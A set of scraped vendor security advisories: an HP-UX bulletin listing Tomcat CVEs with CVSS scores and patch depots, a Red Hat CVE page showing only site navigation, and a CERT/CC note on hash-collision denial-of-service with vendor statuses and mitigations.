From:       [security-alert () hp ! com](?a=90366096700007&r=1&w=2)
Date:       [2013-04-01 16:24:28](?l=bugtraq&r=1&w=2&b=201304)
Message-ID: [20130401162428.548E61FDAC () security ! hp ! com](?i=20130401162428.548E61FDAC%20()%20security%20!%20hp%20!%20com)
[Download RAW [message](?l=bugtraq&m=136485229118404&q=mbox) or [body](?l=bugtraq&m=136485229118404&q=raw)]

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Note: the current version of the following document is available here:
<https://h20566.www2.hp.com/portal/site/hpsc/public/kb/>
docDisplay?docId=emr_na-c03716627

SUPPORT COMMUNICATION - SECURITY BULLETIN

Document ID: c03716627
Version: 1

HPSBUX02860 SSRT101146 rev.1 - HP-UX Apache Running Tomcat Servlet Engine,
Remote Denial of Service (DoS), Access Restriction Bypass, Unauthorized
Modification and Other Vulnerabilities

NOTICE: The information in this Security Bulletin should be acted upon as
soon as possible.

Release Date: 2013-03-28
Last Updated: 2013-03-28

- ----------------------------------------------------------------------------

Potential Security Impact: Remote Denial of Service (DoS), access restriction
bypass, unauthorized modification and other vulnerabilities

Source: Hewlett-Packard Company, HP Software Security Response Team

VULNERABILITY SUMMARY
Potential security vulnerabilities have been identified with HP-UX Apache
running Tomcat Servlet Engine. These vulnerabilities could be exploited
remotely to create a Denial of Service (DoS) or to perform an access
restriction bypass, unauthorized modification, and other vulnerabilities.

References: CVE-2008-5515, CVE-2009-0033, CVE-2009-0580, CVE-2009-0781,
CVE-2009-0783, CVE-2009-2693, CVE-2009-2902, CVE-2009-3548, CVE-2010-1157,
CVE-2010-2227, CVE-2010-3718, CVE-2010-4476, CVE-2011-0013, CVE-2011-1184,
CVE-2011-2204, CVE-2011-2526, CVE-2011-2729, CVE-2011-3190, CVE-2011-4858,
CVE-2012-0022, CVE-2012-5885.

SUPPORTED SOFTWARE VERSIONS*: ONLY impacted versions are listed.
HP-UX B.11.23, B.11.31 running HP-UX Apache running Tomcat Servlet Engine
5.5.35.01 or earlier

BACKGROUND

CVSS 2.0 Base Metrics
===========================================================
  Reference              Base Vector             Base Score
CVE-2008-5515    (AV:N/AC:L/Au:N/C:P/I:N/A:N)       5.0
CVE-2009-0033    (AV:N/AC:L/Au:N/C:N/I:N/A:P)       5.0
CVE-2009-0580    (AV:N/AC:M/Au:N/C:P/I:N/A:N)       4.3
CVE-2009-0781    (AV:N/AC:M/Au:N/C:N/I:P/A:N)       4.3
CVE-2009-0783    (AV:L/AC:L/Au:N/C:P/I:P/A:P)       4.6
CVE-2009-2693    (AV:N/AC:M/Au:N/C:N/I:P/A:P)       5.8
CVE-2009-2902    (AV:N/AC:M/Au:N/C:N/I:P/A:N)       4.3
CVE-2009-3548    (AV:N/AC:L/Au:N/C:P/I:P/A:P)       7.5
CVE-2010-1157    (AV:N/AC:H/Au:N/C:P/I:N/A:N)       2.6
CVE-2010-2227    (AV:N/AC:L/Au:N/C:P/I:N/A:P)       6.4
CVE-2010-3718    (AV:L/AC:H/Au:N/C:N/I:P/A:N)       1.2
CVE-2010-4476    (AV:N/AC:L/Au:N/C:N/I:N/A:P)       5.0
CVE-2011-0013    (AV:N/AC:M/Au:N/C:N/I:P/A:N)       4.3
CVE-2011-1184    (AV:N/AC:L/Au:N/C:P/I:N/A:N)       5.0
CVE-2011-2204    (AV:L/AC:M/Au:N/C:P/I:N/A:N)       1.9
CVE-2011-2526    (AV:L/AC:M/Au:N/C:P/I:P/A:P)       4.4
CVE-2011-2729    (AV:N/AC:L/Au:N/C:P/I:N/A:N)       5.0
CVE-2011-3190    (AV:N/AC:L/Au:N/C:P/I:P/A:P)       7.5
CVE-2011-4858    (AV:N/AC:L/Au:N/C:N/I:N/A:P)       5.0
CVE-2012-0022    (AV:N/AC:L/Au:N/C:N/I:N/A:P)       5.0
CVE-2012-5885    (AV:N/AC:L/Au:N/C:P/I:N/A:N)       5.0
===========================================================
             Information on CVSS is documented
            in HP Customer Notice: HPSN-2008-002

RESOLUTION

HP has provided the following software updates to resolve the vulnerability.
The updates are available for download from <https://h20392.www2.hp.com/portal>
/swdepot/displayProductInfo.do?productNumber=HPUXWST553601

Servlet Version
 Depot Name

HP-UX Apache Tomcat Servlet Engine v5.5.36.01
HP-UX_11.23_HPUXWS22T-B5536-1123.depot

HP-UX_11.31_HPUXWS22T-B5536-1131.depot

MANUAL ACTIONS: Yes - Update
Install HP-UX Apache Tomcat Servlet Engine 5.5.36.01 or subsequent

PRODUCT SPECIFIC INFORMATION

HP-UX Software Assistant: HP-UX Software Assistant is an enhanced application
that replaces HP-UX Security Patch Check. It analyzes all Security Bulletins
issued by HP and lists recommended actions that may apply to a specific HP-UX
system. It can also download patches and create a depot automatically. For
more information see <https://www.hp.com/go/swa>

The following text is for use by the HP-UX Software Assistant.

AFFECTED VERSIONS

HP-UX Web Server Suite
HP-UX B.11.23
HP-UX B.11.31
==================
hpuxws22TOMCAT.TOMCAT
action: install revision B.5.5.36.01 or subsequent

END AFFECTED VERSION

HISTORY
Version:1 (rev.1) - 28 March 2013 Initial release

Third Party Security Patches: Third party security patches that are to be
installed on systems running HP software products should be applied in
accordance with the customer's patch management policy.

Support: For issues about implementing the recommendations of this Security
Bulletin, contact normal HP Services support channel.  For other issues about
the content of this Security Bulletin, send e-mail to security-alert@hp.com.

Report: To report a potential security vulnerability with any HP supported
product, send Email to: security-alert@hp.com

Subscribe: To initiate a subscription to receive future HP Security Bulletin
alerts via Email:
<http://h41183.www4.hp.com/signup_alerts.php?jumpid=hpsc_secbulletins>

Security Bulletin List: A list of HP Security Bulletins, updated
periodically, is contained in HP Security Notice HPSN-2011-001:
<https://h20566.www2.hp.com/portal/site/hpsc/public/kb/>
docDisplay?docId=emr_na-c02964430

Security Bulletin Archive: A list of recently released Security Bulletins is
available here:
<http://h20566.www2.hp.com/portal/site/hpsc/public/kb/secBullArchive/>

Software Product Category: The Software Product Category is represented in
the title by the two characters following HPSB.

3C = 3COM
3P = 3rd Party Software
GN = HP General Software
HF = HP Hardware and Firmware
MP = MPE/iX
MU = Multi-Platform Software
NS = NonStop Servers
OV = OpenVMS
PI = Printing and Imaging
PV = ProCurve
ST = Storage Software
TU = Tru64 UNIX
UX = HP-UX

Copyright 2013 Hewlett-Packard Development Company, L.P.
Hewlett-Packard Company shall not be liable for technical or editorial errors
or omissions contained herein. The information provided is provided "as is"
without warranty of any kind. To the extent permitted by law, neither HP or
its affiliates, subcontractors or suppliers will be liable for
incidental,special or consequential damages including downtime cost; lost
profits;damages relating to the procurement of substitute products or
services; or damages for loss of data, or software restoration. The
information in this document is subject to change without notice.
Hewlett-Packard Company and the names of Hewlett-Packard products referenced
herein are trademarks of Hewlett-Packard Company in the United States and
other countries. Other product and company names mentioned herein may be
trademarks of their respective owners.

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.13 (GNU/Linux)

iEYEARECAAYFAlFZtIoACgkQ4B86/C0qfVlj/gCePJbe0xc/zSlfZq3eBMj7KZ9l
F6MAoP1C1qWzYxpflg1Be1uJHem+tf43
=WDgz
-----END PGP SIGNATURE-----
[[prev in list](?l=bugtraq&m=136483148411286&w=2)] [[next in list](?l=bugtraq&m=136491526005337&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from access.redhat.com_c03f5d3d_20250126_072052.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from www.kb.cert.org_60a504f6_20250125_074726.html ===


search

menu

icon-carat-right

cmu-wordmark

* ×
* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

[[Carnegie Mellon University](https://www.cmu.edu)](https://www.cmu.edu/)

# [Software Engineering Institute](https://www.sei.cmu.edu/)

## CERT Coordination Center

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* Current:  VU#903934

## Hash table implementations vulnerable to algorithmic complexity attacks

#### Vulnerability Note VU#903934

Original Release Date: 2011-12-28 | Last Revised: 2016-02-15

---

### Overview

Some programming language implementations do not sufficiently randomize their hash functions or provide means to limit key collision attacks, which can be leveraged by an unauthenticated attacker to cause a denial-of-service (DoS) condition.

### Description

| Many applications, including common web framework implementations, use hash tables to map key values to associated entries. If the hash table contains entries for different keys that map to the same hash value, a hash collision occurs and additional processing is required to determine which entry is appropriate for the key. If an attacker can generate many requests containing colliding key values, an application performing the hash table lookup may enter a denial of service condition.  Hash collision denial-of-service attacks were first [detailed](http://www.cs.rice.edu/~scrosby/hash/CrosbyWallach_UsenixSec2003.pdf) in 2003, but [recent research](http://www.nruns.com/_downloads/advisory28122011.pdf) details how these attacks apply to modern language hash table implementations. |
| --- |

### Impact

| An application can be forced into a denial-of-service condition. In the case of some web application servers, specially-crafted POST form data may result in a denial-of-service. |
| --- |

### Solution

| **Apply an update**Please review the Vendor Information section of this document for vendor-specific patch and workaround details. |
| --- |

| **Limit CPU time**Limiting the processing time for a single request can help minimize the impact of malicious requests.**Limit maximum POST size**Limiting the maximum POST request size can reduce the number of possible predictable collisions, thus reducing the impact of an attack. **Limit maximum request parameters**Some servers offer the option to limit the number of parameters per request, which can also minimize impact. |
| --- |

### Vendor Information

903934
Filter by status:
All
Affected
Not Affected
Unknown

Filter by content:
 Additional information available

 Sort by:
Status
Alphabetical

Expand all

**Javascript is disabled. Click [here](/vuls/vendor/VU%23903934/) to view vendors.**
### [Apache Tomcat](#DWAN-8PYMUS) Affected

Updated:  December 28, 2011

### Status

Affected

### Vendor Statement

We have not received a statement from the vendor.

### Vendor Information

According to the n.runs AG advisory:
"Tomcat has released updates (7.0.23, 6.0.35) for this issue which limit the number of request parameters using a configuration parameter. The default value of 10.000 should provide sufficient protection."

### Vendor References

* <http://tomcat.apache.org/tomcat-7.0-doc/changelog.html>

### [Microsoft Corporation](#MAPG-8N7Q7G) Affected

Notified:  November 01, 2011  Updated: December 29, 2011

### Status

Affected

### Vendor Statement

We have not received a statement from the vendor.

### Vendor Information

Microsoft has released an update to the .NET Framework with [Microsoft Security Bulletin MS11-100](http://technet.microsoft.com/en-us/security/bulletin/ms11-100.mspx), which addresses this issue.

### Vendor References

* <http://technet.microsoft.com/en-us/security/bulletin/ms11-100.mspx>
* <http://technet.microsoft.com/en-us/security/advisory/2659883>
* <http://blogs.technet.com/b/srd/archive/2011/12/27/more-information-about-the-december-2011-asp-net-vulnerability.aspx>

### [Oracle Corporation](#MAPG-8N7Q7K) Affected

Notified:  November 01, 2011  Updated: February 15, 2016

### Status

Affected

### Vendor Statement

We have not received a statement from the vendor.

### Vendor Information

We are not aware of further vendor information regarding this vulnerability.

### Addendum

New information regarding this vulnerability in Java 8 was provided in Februrary 2016, which was sent to Oracle for review.

If you have feedback, comments, or additional information about this vulnerability, please send us email.

### [Ruby](#MAPG-8N7Q7N) Affected

Notified:  November 01, 2011  Updated: December 28, 2011

### Status

Affected

### Vendor Statement

We have not received a statement from the vendor.

### Vendor Information

According to the n.runs AG advisory:
"CRuby and JRuby provide updates for this issue with a randomized hash function (CRuby 1.8.7-p357, JRuby 1.6.5.1, CVE-2011-4815)."

### Vendor References

* <http://blade.nagaokaut.ac.jp/cgi-bin/scat.rb/ruby/ruby-talk/391606>

### [The PHP Group](#DWAN-8PYMFT) Affected

Updated:  December 28, 2011

### Status

Affected

### Vendor Statement

We have not received a statement from the vendor.

### Vendor Information

According to the n.runs AG advisory:
"PHP 5 uses the DJBX33A (Dan Bernstein's times 33, addition) hash function and parses POST form data into the $\_POST hash table. Because of the structure of the hash function, it is vulnerable to an equivalent substring attack."

From the Workarounds section:
"The easiest way to reduce the impact of such an attack is to reduce the CPU time that a request is allowed to take. For PHP, this can be configured using the max\_input\_time parameter."

PHP 5.4.0 RC4 has been released which adds a max\_input\_vars directive to help mitigate hash collision attacks. Please note that this is a release candidate, not a stable release.

### Vendor References

* <http://www.php.net/archive/2011.php#id2011-12-25-1>

### [Adobe](#MAPG-8N7Q7A) Unknown

Notified:  November 01, 2011  Updated: November 01, 2011

### Status

Unknown

### Vendor Statement

We have not received a statement from the vendor.

### Vendor Information

We are not aware of further vendor information regarding this vulnerability.

### [IBM Corporation](#MAPG-8N7Q7D) Unknown

Notified:  November 01, 2011  Updated: November 01, 2011

### Status

Unknown

### Vendor Statement

We have not received a statement from the vendor.

### Vendor Information

We are not aware of further vendor information regarding this vulnerability.

### CVSS Metrics

| Group | Score | Vector |
| --- | --- | --- |
| Base | 0 | AV:--/AC:--/Au:--/C:--/I:--/A:-- |
| Temporal | 0 | E:ND/RL:ND/RC:ND |
| Environmental | 0 | CDP:ND/TD:ND/CR:ND/IR:ND/AR:ND |

### References

* <http://www.ocert.org/advisories/ocert-2011-003.html>
* <http://www.nruns.com/_downloads/advisory28122011.pdf>
* <http://www.cs.rice.edu/~scrosby/hash/CrosbyWallach_UsenixSec2003.pdf>
* <http://technet.microsoft.com/en-us/security/bulletin/ms11-100.mspx>
### Acknowledgements

Thanks to Alexander Klink and Julian Wälde for reporting these vulnerabilities.

This document was written by Jared Allar and David Warren.

### Other Information

| **CVE IDs:** | [CVE-2011-4815](http://web.nvd.nist.gov/vuln/detail/CVE-2011-4815), [CVE-2011-3414](http://web.nvd.nist.gov/vuln/detail/CVE-2011-3414), [CVE-2011-4838](http://web.nvd.nist.gov/vuln/detail/CVE-2011-4838), [CVE-2011-4885](http://web.nvd.nist.gov/vuln/detail/CVE-2011-4885) |
| --- | --- |
| **Severity Metric:** | 10.80 |
| **Date Public:** | 2011-12-28 |
| **Date First Published:** | 2011-12-28 |
| **Date Last Updated:** | 2016-02-15 20:05 UTC |
| **Document Revision:** | 41 |

* [About vulnerability notes](https://vuls.cert.org/confluence/display/VIN/Vulnerability%2BNote%2BHelp)
* Contact us about this vulnerability
* [Provide a vendor statement](https://vuls.cert.org/confluence/display/VIN/Case%2BHandling#CaseHandling-Givingavendorstatusandstatement)

Sponsored by [CISA.](https://www.cisa.gov/cybersecurity)

 [Download PGP Key](https://vuls.cert.org/confluence/pages/viewpage.action?pageId=25985026)

[Read CERT/CC Blog](https://insights.sei.cmu.edu/cert/)

[Learn about Vulnerability Analysis](https://www.sei.cmu.edu/research-capabilities/all-work/display.cfm?customel_datapageid_4050=21304)

Carnegie Mellon University

Software Engineering Institute

4500 Fifth Avenue

Pittsburgh, PA 15213-2612

412-268-5800

[Office Locations](http://www.sei.cmu.edu/locations/index.cfm) | [Additional Sites Directory](http://www.sei.cmu.edu/additional-sites-directory/index.cfm) | [Legal](https://vuls.cert.org/confluence/display/VIN/VINCE%2BCode%2Bof%2BConduct#VINCECodeofConduct-TermsofUse) | [Privacy Notice](https://www.sei.cmu.edu/legal/privacy-notice/index.cfm) | [CMU Ethics Hotline](https://www.cmu.edu/hr/ethics-hotline/) | [www.sei.cmu.edu](http://www.sei.cmu.edu)

Â©2022 Carnegie Mellon University

[Contact SEI](https://www.sei.cmu.edu/contact-us/)
#### Contact CERT/CC

 412-268-5800


